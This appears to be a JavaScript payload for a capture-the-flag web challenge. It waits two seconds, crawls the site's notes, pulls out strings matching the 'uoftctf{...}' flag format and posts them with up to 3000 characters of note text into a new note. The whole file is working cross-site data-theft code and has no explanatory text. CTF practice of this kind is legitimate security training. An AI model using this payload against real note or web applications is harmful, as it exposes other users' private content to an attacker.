// Wait 2 seconds then fetch
setTimeout(function(){
  fetch('/').then(function(r){ return r.text(); }).then(function(html){
    var noteIds = html.match(/\/note\/[a-f0-9]+/g) || [];
    var unique = [];
    noteIds.forEach(function(n){ if(unique.indexOf(n)===-1) unique.push(n); });
    
    // Fetch all notes
    Promise.all(unique.map(function(n){
      return fetch(n).then(function(r){ return r.text(); }).catch(function(){ return ''; });
    })).then(function(pages){
      var allText = pages.join('\n');
      var flags = allText.match(/uoftctf\{[^}]+\}/g) || [];
      
      fetch('/note/new', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'title=DELAYED&body=' + encodeURIComponent(
          'FLAGS:' + (flags.length ? flags.join(',') : 'NONE') +
          '\nNOTE_COUNT:' + unique.length +
          '\nALL:' + allText.substring(0, 3000)
        )
      });
    });
  });
}, 2000);
